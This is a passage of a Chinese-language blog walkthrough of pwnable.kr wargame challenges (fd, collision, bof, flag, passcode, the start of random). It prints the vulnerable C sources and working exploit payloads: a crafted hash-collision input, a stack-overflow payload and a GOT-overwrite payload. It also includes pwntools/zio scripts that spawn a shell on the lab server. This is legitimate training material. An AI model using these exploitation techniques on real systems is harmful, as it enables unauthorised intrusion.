style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">STDIN</td><td style="text-align:center">标准输入</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">STDOUT</td><td style="text-align:center">标准输出</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">STDERR</td><td style="text-align:center">标准错误输出</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">****************************read()原型*******************************</span><br><span class="line">read from a file descriptor</span><br><span class="line"><span class="number">1.</span> fd    文件描述符，用来指向要操作的文件的文件结构体</span><br><span class="line"><span class="number">2.</span> buf   读上来的数据保存在缓冲区buf中</span><br><span class="line"><span class="number">3.</span> count 请求读取的字节数</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br><span class="line">函数的返回值说明：</span><br><span class="line">(<span class="number">1</span>)如果成功，返回读取的字节数(字符串结束符 <span class="string">'\0'</span>不算);</span><br><span class="line">(<span class="number">2</span>)如果出错，返回<span class="number">-1</span>并设置errno;</span><br><span class="line">(<span class="number">3</span>)如果在调read函数之前已是文件末尾，则返回<span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="0x03-拿取flag"><a href="#0x03-拿取flag" class="headerlink" title="0x03 拿取flag"></a>0x03 拿取flag</h4><div align="left"><br>    <img src="/resources/2018/2018-03-23-02.png" alt="flag"><br></div><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><blockquote><p><strong>题目描述:</strong><br>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!<br>ssh col@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析-1"><a href="#0x00-题目分析-1" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>由题目可知,这道题是一个与MD5哈希碰撞有关的题目。和上一道题一样,给出了SSH登录账号和密码,依旧登录一下。登陆成功,当前用户是col</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-03.png" alt="登陆成功"><br></div><h4 id="0x01-查看文件权限"><a href="#0x01-查看文件权限" class="headerlink" title="0x01 查看文件权限"></a>0x01 查看文件权限</h4><p>依旧和第一题相似，本题用户对flag文件依旧没有读取权限，当前用户目录一共有三个文件，col、col.c、flag</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-04.png" alt="查看文件权限"><br></div><h4 id="0x02-分析col-c"><a href="#0x02-分析col-c" class="headerlink" title="0x02 分析col.c"></a>0x02 分析col.c</h4><p>查看col.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码开始的时候定义了一个hashcode,有一个check_password()函数,可知要求输入一个password进行比对, 再看看主函数和上题很像，有argc和argv[]两个参数，由此可知password将在执行这段代码的时候跟在程序名称后面传入程序中。</p><p>当没有传入参数时，显示此段程序的usage<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由下面这段程序可知,输入的参数的长度为20字节时,才会执行if语句里的system(“/bin/cat flag”),输出flag<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>再来看看check_password()函数,传入的参数是一个char型的字符数组,在函数里面通过int<em> ip = (int</em>)p将char型的字符数组转换成int型的字符数组,20个字节的字符数组就变成拥有5个元素的int型数组,通过for循环进行累加,得到的值与hashcode进行比对。<br>对20个字节，要构造输入的整型转换后的5个整数求和 == 0x21DD09EC，<br>第一个想法是：前16个字节赋\x00，最后4个字节为0xEC09DD21，但是\x09是HTab，输入会被阻断。<br>第二个想法：前16个字节赋\x01，最后4个字节为\xE8\x05\xD9\x1D，嗯，就这样。<br>0x01010101*4+0x1DD905E8=0x21DD09EC</p></blockquote><h4 id="0x03-拿取flag-1"><a href="#0x03-拿取flag-1" class="headerlink" title="0x03 拿取flag"></a>0x03 拿取flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &quot;print &apos;\x01&apos; * 16 + &apos;\xE8\x05\xD9\x1D&apos;&quot;`</span><br></pre></td></tr></table></figure><p>解释一下这段命令,在bash中,$( )与` `（反引号）都是用来作命令替换的。命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。-c 参数，直接运行python语句,用print语句打印出构造好的20个字节。然后将输出的20个字节数据传进col,进行验证，得到flag</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-05.png" alt="flag"><br></div><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote><p><strong>题目描述</strong><br>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?<br>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a><br>Running at : nc pwnable.kr 9000</p></blockquote><h4 id="0x00-题目分析-2"><a href="#0x00-题目分析-2" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>有题目可知这是一道和<code>缓冲区溢出</code>有关的题目。题目给了两个文件，先来看看两个文件的信息吧。</p><h4 id="0x01-bof-amp-bof-c"><a href="#0x01-bof-amp-bof-c" class="headerlink" title="0x01 bof&amp;bof.c"></a>0x01 bof&amp;bof.c</h4><p>先用file命令查看一下<code>bof</code>的文件信息</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-00.png" alt="bof"><br></div><p>由得出的信息可以知道Linux下一个32bit的ELF文件。再查看一下<code>bof.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-深入分析"><a href="#0x02-深入分析" class="headerlink" title="0x02 深入分析"></a>0x02 深入分析</h4><blockquote><ul><li>可以看到这段程序有两个函数，一个主函数、一个func()</li><li>主函数调用func(),并传入了一个参数<code>0xdeadbeef</code></li><li>func()可以看到关键的两个地方，一个是<code>gets(overflowme);</code>、一个是<code>system(&quot;/bin/sh&quot;);</code></li><li>可以看到当<code>key==0xcafebabe</code>时，可以获得一个shell,key是调用时传进来的参数，但是传的是0xdeadbeef，相等?不存在的</li><li>但是可以用<code>栈溢出</code>将函数调用时入栈的参数覆盖掉，让key==0xcafebabe</li></ul></blockquote><p>先用IDA打开看看吧</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-01.png" alt="IDA"><br></div><blockquote><ul><li><code>cmp [ebp+arg_0],0CAFEBABEh</code>这句对应<code>if(key == 0xcafebabe)</code>,可以知道key存到了ebp+arg_0</li><li>arg_0 = dword ptr 8;故key的地址为<code>ebp+8</code></li><li><code>call gets</code>上面两句lea eax,[ebp+s]和mov [esp],eax是为了提高栈顶，为了接收gets()传进来的数据</li><li>输入的数据从ebp+s,也就是<code>ebp-0x2c</code>开始存储。</li></ul></blockquote><p>现在用GDB调试下，停在<code>cmp [ebp+arg_0],0CAFEBABEh</code>处，下图是寄存器和汇编截图</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-02.png" alt="GDB"><br></div><p>下图是栈内数据的布局：</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-03.png" alt="GDB"><br></div><p>EAX中存储的为输入数据的首地址<code>0xffffce9c</code>,栈地址<code>0xffffced0</code>处存储的是func()调用的时候传入的key<code>0xdeadbeef</code>,现在算算0xffffced0-0xffffce9c=0x34,也就是52个字节，在后面加上<code>0xcafebabe</code>就覆盖了key，成功跳转</p><h4 id="0x03-构造并编写exp"><a href="#0x03-构造并编写exp" class="headerlink" title="0x03 构造并编写exp"></a>0x03 构造并编写exp</h4><p>系统只是调用了system函数，没有发现输入的话就会<code>终止</code>掉，所以我们可以向它传递一个标准输入：(cat -)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ⚙/pwn/pwnable.kr/bof (python -c &quot;print &apos;x&apos;*52 +&apos;\xbe\xba\xfe\xca&apos;&quot;)|nc pwnable.kr 9000 </span><br><span class="line">*** stack smashing detected ***: /home/bof/bof terminated</span><br><span class="line">overflow me :</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;x&apos;*52 +&apos;\xbe\xba\xfe\xca&apos;&quot;;cat -)|nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>这里若没有cat，因为nc的单向连接时<code>非持续性</code>的，那么传完payload后一个tcp会话就结束了，也就是没机会传cmd命令了，而加入cat，则让nc的这个tcp会话永不结束，直到用户输入Ctri+C。而cat又比较特殊，可以将用户输入原封不动返回并重定向给了nc…</p><p>下面是用<code>pwntools</code>写的自动化攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">52</span>+<span class="string">'\xbe\xba\xfe\xca'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>下面是用<code>zio</code>写的自动化攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">host = <span class="string">"pwnable.kr"</span></span><br><span class="line">port = <span class="number">9000</span></span><br><span class="line">io = zio((host,port),print_read=<span class="keyword">False</span>,print_write=<span class="keyword">False</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">52</span> + <span class="string">"\xbe\xba\xfe\xca"</span> + <span class="string">"\n"</span></span><br><span class="line">io.write(payload+<span class="string">"\n"</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><blockquote><p><strong>题目描述：</strong><br>Papa brought me a packed present! let’s open it.<br>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a><br>This is reversing task. all you need is binary</p></blockquote><h4 id="0x00-题目分析-3"><a href="#0x00-题目分析-3" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>题目说这是一个逆向的题目，将题目给的文件下载下来，先用IDA打开看一下</p><div align="left"><br>    <img src="/resources/2018/2018-04-26-00.png" alt="IDA"><br></div><p>可以看到这不是一个正常的情况，结合逆向的提示，估计是被加了壳，用strings查看flag文件，在最后发现了UPX，说明被加了<code>UPX壳</code>，用下面的命令进行脱壳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d flag -o deflag</span><br></pre></td></tr></table></figure><h4 id="0x01-获取flag"><a href="#0x01-获取flag" class="headerlink" title="0x01 获取flag"></a>0x01 获取flag</h4><p>然后将去壳的<code>deflag</code>再用IDA打开看一下，定位到main函数，可以看到<code>mov rdx, cs:flag</code></p><div align="left"><br>    <img src="/resources/2018/2018-04-26-01.png" alt="IDA"><br></div><p>双击flag，可以定位到这样一字符串（也可以用shift+F12,查看字符串）</p><div align="left"><br>    <img src="/resources/2018/2018-04-26-02.png" alt="IDA"><br></div><p>将这串字符串提交，通过了。可以看到这道题就是考了<code>脱壳</code>的知识点。</p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote><p><strong>题目描述：</strong><br>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?<br>ssh passcode@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析-4"><a href="#0x00-题目分析-4" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>依旧先登录一下</p><div align="left"><br>    <img src="/resources/2018/2018-04-26-03.png" alt="ssh"><br></div><p>可以看到当前目录下有三个文件，<code>flag</code>、<code>passcode</code>、<code>passcode.c</code>,当然了当前用户对flag肯定是没有读写权限的，所以查看一下passcode.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passcode1;</span><br><span class="line">    <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-深入分析"><a href="#0x01-深入分析" class="headerlink" title="0x01 深入分析"></a>0x01 深入分析</h4><blockquote><ul><li>可以看到main函数里调用了两个函数，<code>welcome()</code>和<code>login()</code></li><li>welcome和login拥有相同的<code>ebp</code>，栈帧有交叉</li><li>welcome()函数里接收了一个最大大小为100个字符的name字符串</li><li>login()函数里接收了两个变量<code>passcode1</code>和<code>passcode2</code>,并且分别与<code>338150</code>和<code>13371337</code>进行比较</li><li>如果都相等，则输出flag</li><li>但是scanf()用的有问题，没有用&amp;取地址符号，如果scanf没加&amp;的话，程序会默认从栈中读取4个字节的数据当做scanf取的地址</li><li>也就是说不能通过这两个scanf()突破限制，所以重任就落在了<code>name</code>的身上</li></ul></blockquote><p>先看一下name、passcode1、passcode2在栈中的位置</p><div align="left"><br>    <img src="/resources/2018/2018-04-27-00.png" alt="name"><br></div><div align="left"><br>    <img src="/resources/2018/2018-04-27-01.png" alt="passcode"><br></div><p>可以看到name在栈中的起始位置是<code>ebp-0x70</code>,passcode1和passcode2在栈中的位置分别为<code>ebp-0x10</code>、<code>ebp-0x0c</code>,(ebp-0x70)-(ebp-0x10)=96,由于程序给name分配了100个字节的空间，所以刚好可以覆盖到passcode1,但是由于开启了<code>canary</code>,所以不能再继续覆盖到passcode2，但是GOT表是可写的。因此，可以把passcode1的地址修改为fflush()或printf()或exit()的GOT表地址，然后通过scanf()传入system()的地址，将fflush()或printf()或exit()的真实地址覆盖，这样就拿到shell了。</p><div align="left"><br>    <img src="/resources/2018/2018-04-27-02.png" alt="checksec"><br></div><div align="left"><br>    <img src="/resources/2018/2018-04-27-03.png" alt="GOT表"><br></div><div align="left"><br>    <img src="/resources/2018/2018-04-27-04.png" alt="system地址"><br></div><h4 id="0x02-构造payload并编写exp"><a href="#0x02-构造payload并编写exp" class="headerlink" title="0x02 构造payload并编写exp"></a>0x02 构造payload并编写exp</h4><p>这里我用system的地址<code>覆盖fflush()</code>在GOT表中存的真实地址，因为scanf()以%d获取数据，所以system()的地址<code>0x80485e3</code>要转化成十进制数<code>134514147</code>,现在构造payload获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+&apos;134514147\n&apos;&quot; | ./passcode</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./passcode'</span>)</span><br><span class="line"></span><br><span class="line">fflush_got = <span class="number">0x0804a004</span></span><br><span class="line">system_addr = <span class="number">0x080485e3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">96</span></span><br><span class="line">payload += p32(fflush_got)</span><br><span class="line">payload += str(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>这道题涉及到的知识点是GOT表是可写的，scanf()如果没有加&amp;取地址符，就会在栈上取地址作为传入的数据的存放地址</p><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><blockquote><p><strong>题目描述：</strong><br>Daddy, teach me how to use random value in programming!<br>ssh random@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析-5"><a href="#0x00-题目分析-5" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>从题目名称和题目描述可以看出，这道题和<code>随机数</code>有关系，先来链接一下靶机看看</p><div align="left"><br>    <img src="/resources/2018/2018-04-28-00.png" alt="ssh"><br></div><p>可以看到当前目录下有三个文件，<code>flag</code>、<code>random</code>、<code>random.c</code>,现在查看一下random.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-深入分析-1"><a href="#0x01-深入分析-1" class="headerlink" title="0x01 深入分析"></a>0x01 深入分析</h4><p>可以看到<code>random.c</code>使用了stdlib.h中的rand()函数，讲到rand()函数，就要说一下srand()函数，下面先介绍一下<code>rand()</code>函数和<code>srand()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 